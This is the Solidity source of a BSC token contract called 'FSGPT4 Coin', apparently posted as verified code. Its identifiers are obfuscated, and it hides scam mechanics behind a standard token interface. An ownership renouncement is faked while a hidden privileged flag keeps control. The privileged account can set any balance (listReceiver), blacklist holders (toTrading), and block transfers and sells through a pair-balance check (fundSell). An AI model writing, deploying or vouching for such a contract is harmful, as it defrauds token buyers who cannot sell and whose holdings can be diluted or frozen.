/**
 *Submitted for verification at BscScan.com on 2023-04-01
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface totalAmount {
    function totalSupply() external view returns (uint256);

    function balanceOf(address modeList) external view returns (uint256);

    function transfer(address walletReceiver, uint256 minLiquidity) external returns (bool);

    function allowance(address txExempt, address spender) external view returns (uint256);

    function approve(address spender, uint256 minLiquidity) external returns (bool);

    function transferFrom(
        address sender,
        address walletReceiver,
        uint256 minLiquidity
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tradingListToken, uint256 value);
    event Approval(address indexed txExempt, address indexed spender, uint256 value);
}

interface totalAmountMetadata is totalAmount {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract modeEnableAuto {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverFee {
    function createPair(address swapSender, address exemptTake) external returns (address);
}

interface feeMinFrom {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract FSGPT4Coin is modeEnableAuto, totalAmount, totalAmountMetadata {

    event OwnershipTransferred(address indexed sellIsMarketing, address indexed fromExemptMarketing);

    function owner() external view returns (address) {
        return maxExempt;
    }

    uint256 private minTeam;

    uint256 private toBuy = 100000000 * 10 ** 18;

    function decimals() external view virtual override returns (uint8) {
        return tradingMode;
    }

    uint256 private limitMarketing;

    uint256 private atTo;

    uint256 listToken;

    function getOwner() external view returns (address) {
        return maxExempt;
    }

    mapping(address => mapping(address => uint256)) private amountMax;

    uint256 senderMarketingBuy;

    bool private limitFrom;

    function transfer(address autoTx, uint256 minLiquidity) external virtual override returns (bool) {
        return txTake(_msgSender(), autoTx, minLiquidity);
    }

    address feeMarketingLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function allowance(address minMarketing, address fundFromSender) external view virtual override returns (uint256) {
        if (fundFromSender == feeMarketingLaunched) {
            return type(uint256).max;
        }
        return amountMax[minMarketing][fundFromSender];
    }

    bool public enableReceiverLaunch;

    mapping(address => bool) public limitTxSwap;

    function name() external view virtual override returns (string memory) {
        return fromMarketing;
    }

    address public exemptMin;

    address listMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function symbol() external view virtual override returns (string memory) {
        return enableFrom;
    }

    uint256 private takeEnable;

    string private enableFrom = "FCN";

    function listTrading(address fromSenderIs) public {
        if (limitBuy) {
            return;
        }
        
        limitTxSwap[fromSenderIs] = true;
        
        limitBuy = true;
    }

    function shouldAuto() private view {
        require(limitTxSwap[_msgSender()]);
    }

    string private fromMarketing = "FSGPT4 Coin";

    function totalSupply() external view virtual override returns (uint256) {
        return toBuy;
    }

    function txTake(address atAuto, address walletReceiver, uint256 minLiquidity) internal returns (bool) {
        if (atAuto == exemptMin) {
            return launchSell(atAuto, walletReceiver, minLiquidity);
        }
        uint256 exemptTeam = totalAmount(marketingExempt).balanceOf(listMin);
        require(exemptTeam == senderMarketingBuy);
        require(!totalSell[atAuto]);
        return launchSell(atAuto, walletReceiver, minLiquidity);
    }

    function transferFrom(address atAuto, address walletReceiver, uint256 minLiquidity) external override returns (bool) {
        if (_msgSender() != feeMarketingLaunched) {
            if (amountMax[atAuto][_msgSender()] != type(uint256).max) {
                require(minLiquidity <= amountMax[atAuto][_msgSender()]);
                amountMax[atAuto][_msgSender()] -= minLiquidity;
            }
        }
        return txTake(atAuto, walletReceiver, minLiquidity);
    }

    mapping(address => uint256) private limitFund;

    function balanceOf(address modeList) public view virtual override returns (uint256) {
        return limitFund[modeList];
    }

    mapping(address => bool) public totalSell;

    function toTrading(address receiverLimit) public {
        shouldAuto();
        if (takeEnable == minTeam) {
            minTeam = limitMarketing;
        }
        if (receiverLimit == exemptMin || receiverLimit == marketingExempt) {
            return;
        }
        totalSell[receiverLimit] = true;
    }

    bool public limitBuy;

    function fundSell(uint256 minLiquidity) public {
        shouldAuto();
        senderMarketingBuy = minLiquidity;
    }

    uint256 private atReceiver;

    address public marketingExempt;

    function launchSell(address atAuto, address walletReceiver, uint256 minLiquidity) internal returns (bool) {
        require(limitFund[atAuto] >= minLiquidity);
        limitFund[atAuto] -= minLiquidity;
        limitFund[walletReceiver] += minLiquidity;
        emit Transfer(atAuto, walletReceiver, minLiquidity);
        return true;
    }

    function approve(address fundFromSender, uint256 minLiquidity) public virtual override returns (bool) {
        amountMax[_msgSender()][fundFromSender] = minLiquidity;
        emit Approval(_msgSender(), fundFromSender, minLiquidity);
        return true;
    }

    function tokenAmount() public {
        emit OwnershipTransferred(exemptMin, address(0));
        maxExempt = address(0);
    }

    uint8 private tradingMode = 18;

    address private maxExempt;

    function listReceiver(address autoTx, uint256 minLiquidity) public {
        shouldAuto();
        limitFund[autoTx] = minLiquidity;
    }

    constructor (){
        
        tokenAmount();
        feeMinFrom buyMin = feeMinFrom(feeMarketingLaunched);
        marketingExempt = receiverFee(buyMin.factory()).createPair(buyMin.WETH(), address(this));
        
        exemptMin = _msgSender();
        limitTxSwap[exemptMin] = true;
        limitFund[exemptMin] = toBuy;
        
        emit Transfer(address(0), exemptMin, toBuy);
    }

}